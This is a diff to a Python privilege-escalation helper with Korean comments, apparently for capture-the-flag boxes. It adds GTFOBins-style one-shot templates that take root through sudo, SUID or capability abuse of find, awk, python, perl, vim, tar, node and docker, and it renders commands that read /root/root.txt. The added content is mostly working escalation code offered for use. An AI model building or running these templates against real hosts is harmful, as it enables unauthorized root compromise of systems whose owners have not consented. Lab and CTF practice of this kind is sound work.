@@ -62,15 +62,60 @@ _SUID_COMMON = {
 }
 
 
+# 비대화형(one-shot SSH 용) 상승 템플릿 — {payload} 를 'root 로 돌릴 한 줄'로, {bin} 을
+# 바이너리 경로로 치환해 '대화형 /bin/sh 스폰 없이' 바로 payload 를 실행하는 형태.
+# TTY 없는 one-shot(`sshpass ssh "<cmd>"`)에서도 동작하도록 설계(생성 전용 — 문자열만).
+# {payload} 에 'id' 를 넣으면 uid=0 검증, 'cat /root/root.txt' 를 넣으면 루트 플래그 직독.
+_ONESHOT: dict[str, dict[str, str]] = {
+    "find": {"sudo": "sudo find . -maxdepth 0 -exec {payload} \\;",
+             "suid": "{bin} . -maxdepth 0 -exec {payload} \\;"},
+    "awk": {"sudo": "sudo awk 'BEGIN{system(\"{payload}\")}'",
+            "suid": "{bin} 'BEGIN{system(\"{payload}\")}'"},
+    "gawk": {"sudo": "sudo gawk 'BEGIN{system(\"{payload}\")}'"},
+    "python": {"sudo": "sudo python -c 'import os;os.system(\"{payload}\")'",
+               "suid": "{bin} -c 'import os;os.setuid(0);os.system(\"{payload}\")'",
+               "cap": "{bin} -c 'import os;os.setuid(0);os.system(\"{payload}\")'"},
+    "python3": {"sudo": "sudo python3 -c 'import os;os.system(\"{payload}\")'",
+                "suid": "{bin} -c 'import os;os.setuid(0);os.system(\"{payload}\")'",
+                "cap": "{bin} -c 'import os;os.setuid(0);os.system(\"{payload}\")'"},
+    "perl": {"sudo": "sudo perl -e 'system(\"{payload}\")'",
+             "suid": "{bin} -e 'use POSIX qw(setuid);setuid(0);system(\"{payload}\")'",
+             "cap": "{bin} -e 'use POSIX qw(setuid);setuid(0);system(\"{payload}\")'"},
+    "ruby": {"sudo": "sudo ruby -e 'system(\"{payload}\")'"},
+    "bash": {"sudo": "sudo bash -c '{payload}'", "suid": "{bin} -p -c '{payload}'"},
+    "sh": {"sudo": "sudo sh -c '{payload}'", "suid": "{bin} -p -c '{payload}'"},
+    "env": {"sudo": "sudo env {payload}", "suid": "{bin} {payload}"},
+    "vim": {"sudo": "sudo vim -c ':!{payload}' -c ':q!'"},
+    "vi": {"sudo": "sudo vi -c ':!{payload}' -c ':q!'"},
+    "tar": {"sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 "
+                    "--checkpoint-action=exec='{payload}'"},
+    "node": {"cap": "{bin} -e 'process.setuid(0);require(\"child_process\")"
+                    ".execSync(\"{payload}\",{stdio:\"inherit\"})'"},
+    "docker": {"sudo": "sudo docker run -v /:/mnt --rm alpine chroot /mnt sh -c '{payload}'"},
+}
+
+
 @dataclass
 class PrivescVector:
     """구체적 권한상승 벡터 + 상승 '제안 명령'(실행 아님 — 파싱·생성 결과)."""
     kind: str                 # sudo / suid / capability / sudo-all / writable-passwd
     binary: str = ""
     detail: str = ""
-    plan: str = ""            # GTFOBins 식 상승 제안(획득한 셸에서 사람이 실행)
+    plan: str = ""            # GTFOBins 식 상승 제안(대화형 — 획득한 셸에서 사람이 실행)
     confidence: str = "med"   # high / med / low
     source: str = "GTFOBins"
+    path: str = ""            # 바이너리 전체 경로(one-shot 템플릿 치환용)
+    oneshot_tmpl: str = ""    # 비대화형 템플릿({payload}/{bin} 치환) — 없으면 빈 문자열
+
+    def oneshot(self, payload: str = "id") -> str:
+        """비대화형(one-shot SSH 용) 상승 명령 생성 — {payload} 를 'root 로 돌릴 명령'으로 치환.
+        실행 아님 — 문자열 생성만. 템플릿이 없으면 빈 문자열(폴백은 호출측 몫).
+        예) oneshot('id') → uid=0 검증용, oneshot('cat /root/root.txt') → 루트 플래그 직독."""
+        if not self.oneshot_tmpl:
+            return ""
+        return (self.oneshot_tmpl
+                .replace("{bin}", self.path or self.binary)
+                .replace("{payload}", payload))
 
     def __str__(self) -> str:
         head = f"[{self.kind}] {self.binary}".rstrip()
@@ -80,6 +125,28 @@ class PrivescVector:
 
 def _basename(path: str) -> str:
     return re.sub(r"^.*/", "", (path or "").strip())
+
+
+def _name_keys(b: str) -> list[str]:
+    """바이너리 basename → 레지스트리 조회 후보키(버전 접미 정규화).
+    예: python3.8 → [python3.8, python3, python]. 중복 없이 순서 보존."""
+    keys = [b]
+    stripped = re.sub(r"\.\d+$", "", b)      # python3.8 → python3
+    if stripped != b:
+        keys.append(stripped)
+    nodigit = re.sub(r"[\d.]+$", "", b)      # python3.8 → python
+    if nodigit and nodigit not in keys:
+        keys.append(nodigit)
+    return keys
+
+
+def _lookup(table: dict, b: str, kind: str) -> str:
+    """table(_GTFO/_ONESHOT)에서 b(버전 접미 정규화 포함)의 kind 템플릿을 찾는다(없으면 '')."""
+    for k in _name_keys(b):
+        t = table.get(k, {}).get(kind)
+        if t:
+            return t
+    return ""
 
 
 def analyze_sudo(output: str) -> list[PrivescVector]:
@@ -93,18 +160,20 @@ def analyze_sudo(output: str) -> list[PrivescVector]:
     if re.search(r"\(all\s*(?::\s*all)?\)\s+all\b", low):
         vectors.append(PrivescVector(
             "sudo-all", "ALL", "모든 명령 sudo 가능 → 'sudo su -' 또는 'sudo /bin/sh'",
-            "sudo -i   # 또는 sudo /bin/sh", "high", "sudo -l"))
+            "sudo -i   # 또는 sudo /bin/sh", "high", "sudo -l",
+            oneshot_tmpl="sudo {payload}"))
     # NOPASSWD/허용된 개별 바이너리
     for m in re.finditer(r"(?:nopasswd:\s*)?((?:/[\w.\-/]+)+)", output):
         path = m.group(1)
         b = _basename(path)
-        tmpl = _GTFO.get(b, {}).get("sudo")
+        tmpl = _lookup(_GTFO, b, "sudo")
         if tmpl:
             nopass = "nopasswd" in output[max(0, m.start() - 40):m.start()].lower()
             vectors.append(PrivescVector(
                 "sudo", b, f"sudo 로 {b} 실행 가능"
                 + (" (NOPASSWD)" if nopass else "") + " → 셸 탈출",
-                tmpl.replace("{bin}", path), "high" if nopass else "med", "GTFOBins"))
+                tmpl.replace("{bin}", path), "high" if nopass else "med", "GTFOBins",
+                path=path, oneshot_tmpl=_lookup(_ONESHOT, b, "sudo")))
     return _dedupe(vectors)
 
 
@@ -120,11 +189,12 @@ def analyze_suid(output: str) -> list[PrivescVector]:
         b = _basename(path)
         if b in _SUID_COMMON:
             continue
-        tmpl = _GTFO.get(b, {}).get("suid")
+        tmpl = _lookup(_GTFO, b, "suid")
         if tmpl:
             vectors.append(PrivescVector(
                 "suid", b, f"SUID {b} → -p 보존 셸/명령 실행으로 euid=0",
-                tmpl.replace("{bin}", path), "high", "GTFOBins"))
+                tmpl.replace("{bin}", path), "high", "GTFOBins",
+                path=path, oneshot_tmpl=_lookup(_ONESHOT, b, "suid")))
     return _dedupe(vectors)
 
 
@@ -149,9 +219,11 @@ def analyze_capabilities(output: str) -> list[PrivescVector]:
                 plan = f"{path} -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'"
             else:
                 plan = f"{path}   # cap_setuid → setuid(0) 후 셸"
+            cap_tmpl = _lookup(_ONESHOT, b, "cap")
             vectors.append(PrivescVector(
                 "capability", b, f"{b} 에 cap_setuid+ep → setuid(0) 가능",
-                plan, "high", "GTFOBins/caps"))
+                plan, "high", "GTFOBins/caps",
+                path=path, oneshot_tmpl=cap_tmpl))
     return _dedupe(vectors)
 
 
@@ -189,5 +261,8 @@ def render_vectors(vectors: list[PrivescVector], top: int = 8) -> str:
     for v in vectors[:top]:
         lines.append(f"  {v}")
         if v.plan:
-            lines.append(f"      ↳ {v.plan}")
+            lines.append(f"      ↳ 대화형: {v.plan}")
+        root_read = v.oneshot("cat /root/root.txt 2>/dev/null")
+        if root_read:
+            lines.append(f"      ↳ 비대화형(one-shot): {root_read}")
     return "\n".join(lines)
